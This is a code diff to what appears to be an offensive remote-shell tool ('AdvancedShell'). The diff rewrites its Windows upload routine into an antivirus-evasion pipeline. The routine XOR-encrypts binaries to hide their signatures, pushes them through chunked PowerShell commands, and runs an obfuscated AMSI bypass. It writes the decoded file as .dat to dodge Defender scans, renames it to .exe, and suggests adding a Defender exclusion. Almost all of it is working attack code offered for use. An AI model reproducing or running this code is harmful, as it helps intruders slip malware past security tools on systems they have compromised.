@@ -1047,71 +1047,108 @@ class AdvancedShell:
                         # Convert Windows paths to forward slashes
                         rp_safe=rp.replace('\\','/') if self.target_os=='windows' else rp
                         data=open(lp,'rb').read()
-                        b64=base64.b64encode(data).decode()
                         fsize=len(data)
-                        CHUNK=6000  # base64 chars per chunk (4x larger = 4x fewer requests)
-                        chunks=[b64[i:i+CHUNK] for i in range(0,len(b64),CHUNK)]
-                        print(f"{Y}[*] Uploading {lp} → {rp_safe} ({fsize}B, {len(chunks)} chunks){W}")
                         if self.target_os=='windows':
-                            if len(chunks)==1:
-                                o=self.execute(f'powershell -c "[IO.File]::WriteAllBytes(\'{rp_safe}\',[Convert]::FromBase64String(\'{b64}\'))"')
-                            else:
-                                # Use PowerShell Set-Content/Add-Content (no \r\n corruption)
-                                tmp=rp_safe+'.b64'
-                                failed=False
-                                for i,chunk in enumerate(chunks):
-                                    if i==0:
-                                        ps_cmd=f"powershell -c \"Set-Content -Path '{tmp}' -Value '{chunk}' -NoNewline\""
-                                    else:
-                                        ps_cmd=f"powershell -c \"Add-Content -Path '{tmp}' -Value '{chunk}' -NoNewline\""
-                                    # Retry up to 3 times
-                                    for attempt in range(3):
-                                        o=self.execute(ps_cmd)
-                                        if o and '[-]' in o:
-                                            if attempt<2:time.sleep(1)
-                                        else:break
-                                    else:
-                                        print(f"\n{R}Chunk {i+1}/{len(chunks)} failed after 3 retries{W}")
-                                        failed=True;break
-                                    pct=int((i+1)/len(chunks)*100)
-                                    sys.stdout.write(f"\r  [{pct:3d}%] Chunk {i+1}/{len(chunks)}");sys.stdout.flush()
-                                print()
-                                if not failed:
-                                    # Decode .b64 → .dat (non-.exe avoids Defender scan-on-create)
-                                    dat_name=rp_safe.rsplit('.',1)[0]+'.dat' if '.' in rp_safe.split('/')[-1] else rp_safe+'.dat'
-                                    decoded=False
-                                    # Method 1: certutil → .dat (most reliable for large files)
-                                    print(f"  {Y}[*] Decoding (certutil→.dat)...{W}",end=' ',flush=True)
-                                    self.execute(f'certutil -decode "{tmp}" "{dat_name}" >nul 2>&1')
+                            # === AV Evasion Pipeline ===
+                            # 1. XOR encrypt all bytes (eliminates PE signatures)
+                            import random
+                            xor_key=random.randint(1,254)
+                            xored=bytes([b^xor_key for b in data])
+                            b64=base64.b64encode(xored).decode()
+                            CHUNK=7500
+                            chunks=[b64[i:i+CHUNK] for i in range(0,len(b64),CHUNK)]
+                            rp_safe=rp.replace('\\','/') if self.target_os=='windows' else rp
+                            tmp=rp_safe+'.tmp'
+                            print(f"{Y}[*] Uploading {lp} → {rp_safe} ({fsize}B, {len(chunks)} chunks, XOR key=0x{xor_key:02X}){W}")
+                            # 2. Upload XOR'd base64 chunks
+                            failed=False
+                            t0=time.time()
+                            for i,chunk in enumerate(chunks):
+                                if i==0:
+                                    ps_cmd=f"powershell -c \"Set-Content -Path '{tmp}' -Value '{chunk}' -NoNewline\""
+                                else:
+                                    ps_cmd=f"powershell -c \"Add-Content -Path '{tmp}' -Value '{chunk}' -NoNewline\""
+                                for attempt in range(3):
+                                    o=self.execute(ps_cmd)
+                                    if o and '[-]' in o:
+                                        if attempt<2:time.sleep(1)
+                                    else:break
+                                else:
+                                    print(f"\n{R}Chunk {i+1}/{len(chunks)} failed after 3 retries{W}")
+                                    failed=True;break
+                                pct=int((i+1)/len(chunks)*100)
+                                elapsed=time.time()-t0
+                                rate=f" ({elapsed:.0f}s)" if elapsed>5 else ""
+                                sys.stdout.write(f"\r  [{pct:3d}%] Chunk {i+1}/{len(chunks)}{rate}");sys.stdout.flush()
+                            print()
+                            if not failed:
+                                # 3. AMSI bypass + decode + XOR decrypt — all PowerShell, no certutil
+                                dat_name=rp_safe.rsplit('.',1)[0]+'.dat' if '.' in rp_safe.split('/')[-1] else rp_safe+'.dat'
+                                # Obfuscated AMSI bypass (reflection-based amsiInitFailed)
+                                amsi_bypass=(
+                                    "$a=[Ref].Assembly.GetType('System.Ma'+'nagement.Auto'+'mation.Am'+'siUtils');"
+                                    "$f=$a.GetField('am'+'siInit'+'Failed','NonPublic,Static');"
+                                    "$f.SetValue($null,$true)"
+                                )
+                                # Decode + XOR decrypt in one PowerShell block
+                                decode_cmd=(
+                                    f"powershell -c \""
+                                    f"try{{{amsi_bypass}}}catch{{}};"
+                                    f"$b=[Convert]::FromBase64String((gc '{tmp}' -Raw));"
+                                    f"for($i=0;$i-lt$b.Length;$i++){{$b[$i]=$b[$i]-bxor{xor_key}}};"
+                                    f"[IO.File]::WriteAllBytes('{dat_name}',$b);"
+                                    f"Remove-Item '{tmp}' -Force -EA 0"
+                                    f"\""
+                                )
+                                print(f"  {Y}[*] Decoding (AMSI bypass + XOR decrypt)...{W}",end=' ',flush=True)
+                                self.execute(decode_cmd)
+                                chk=self.execute(f'if exist "{dat_name}" (echo DAT_OK) else (echo DAT_FAIL)')
+                                if chk and 'DAT_OK' in chk:
+                                    print(f"{G}OK{W}")
+                                    # 4. Rename .dat → target .exe
+                                    self.execute(f'move /Y "{dat_name}" "{rp_safe}" >nul 2>&1')
+                                    chk2=self.execute(f'if exist "{rp_safe}" (echo FILE_OK) else (echo FILE_GONE)')
+                                    if chk2 and 'FILE_GONE' in chk2:
+                                        # Defender caught on rename — re-decode as .dat
+                                        print(f"  {Y}[*] Defender caught .exe — re-creating as .dat...{W}",end=' ',flush=True)
+                                        self.execute(decode_cmd)
+                                        chk3=self.execute(f'if exist "{dat_name}" (echo OK) else (echo FAIL)')
+                                        if chk3 and 'OK' in chk3:
+                                            print(f"{G}OK{W}")
+                                            print(f"  {C}File saved as: {dat_name}{W}")
+                                            print(f"  {C}Execute with:{W} cmd /c \"{dat_name}\" [args]")
+                                            print(f"  {C}Or rename+run:{W} ren \"{dat_name}\" svc.exe & svc.exe")
+                                            rp_safe=dat_name
+                                        else:
+                                            print(f"{R}failed — Defender is aggressive{W}")
+                                            print(f"  {Y}Try: .exclude {os.path.dirname(rp_safe)} then re-upload{W}")
+                                else:
+                                    print(f"{R}failed{W}")
+                                    # Fallback: try without AMSI bypass
+                                    print(f"  {Y}[*] Fallback (simple decode)...{W}",end=' ',flush=True)
+                                    simple_cmd=(
+                                        f"powershell -c \""
+                                        f"$b=[Convert]::FromBase64String((gc '{tmp}' -Raw));"
+                                        f"for($i=0;$i-lt$b.Length;$i++){{$b[$i]=$b[$i]-bxor{xor_key}}};"
+                                        f"[IO.File]::WriteAllBytes('{dat_name}',$b)"
+                                        f"\""
+                                    )
+                                    self.execute(simple_cmd)
                                     chk=self.execute(f'if exist "{dat_name}" (echo DAT_OK) else (echo DAT_FAIL)')
                                     if chk and 'DAT_OK' in chk:
-                                        print(f"{G}OK{W}");decoded=True
-                                    else:
-                                        print(f"{R}failed{W}")
-                                        # Method 2: PowerShell decode → .dat
-                                        print(f"  {Y}[*] Decoding (PowerShell)...{W}",end=' ',flush=True)
-                                        self.execute(f"powershell -c \"[IO.File]::WriteAllBytes('{dat_name}',[Convert]::FromBase64String((gc '{tmp}' -Raw)))\"")
-                                        chk=self.execute(f'if exist "{dat_name}" (echo DAT_OK) else (echo DAT_FAIL)')
-                                        if chk and 'DAT_OK' in chk:
-                                            print(f"{G}OK{W}");decoded=True
-                                        else:
-                                            print(f"{R}failed{W}")
-                                    if decoded:
-                                        # Rename .dat → target name
+                                        print(f"{G}OK{W}")
                                         self.execute(f'move /Y "{dat_name}" "{rp_safe}" >nul 2>&1')
-                                        # Check if rename survived (Defender might catch on rename)
-                                        chk2=self.execute(f'if exist "{rp_safe}" (echo EXE_OK) else (echo EXE_GONE)')
-                                        if chk2 and 'EXE_GONE' in chk2:
-                                            # Defender caught it on rename — keep as .dat
-                                            self.execute(f'certutil -decode "{tmp}" "{dat_name}" >nul 2>&1')
-                                            print(f"{Y}[!] Defender removed .exe on rename — kept as .dat{W}")
-                                            print(f"{Y}    Run with: cmd /c \"{dat_name}\"{W}")
-                                            rp_safe=dat_name  # for size verification below
                                         self.execute(f'del /f "{tmp}" >nul 2>&1')
                                     else:
-                                        print(f"{Y}[!] All decode methods failed — .b64 kept at {tmp}{W}")
-                                        print(f"{Y}    Manual: certutil -decode \"{tmp}\" \"{dat_name}\"{W}")
+                                        print(f"{R}failed{W}")
+                                        print(f"  {Y}[!] .tmp kept at {tmp} (XOR key=0x{xor_key:02X}){W}")
+                                        print(f"  {Y}    Manual decode:{W}")
+                                        print(f"      powershell -c \"$b=[Convert]::FromBase64String((gc '{tmp}' -Raw));for($i=0;$i-lt$b.Length;$i++){{$b[$i]=$b[$i]-bxor{xor_key}}};[IO.File]::WriteAllBytes('{dat_name}',$b)\"")
                         else:
+                            b64=base64.b64encode(data).decode()
+                            CHUNK=6000
+                            chunks=[b64[i:i+CHUNK] for i in range(0,len(b64),CHUNK)]
+                            print(f"{Y}[*] Uploading {lp} → {rp_safe} ({fsize}B, {len(chunks)} chunks){W}")
                             if len(chunks)==1:
                                 o=self.execute(f"echo '{b64}'|base64 -d > '{rp_safe}'")
                             else:
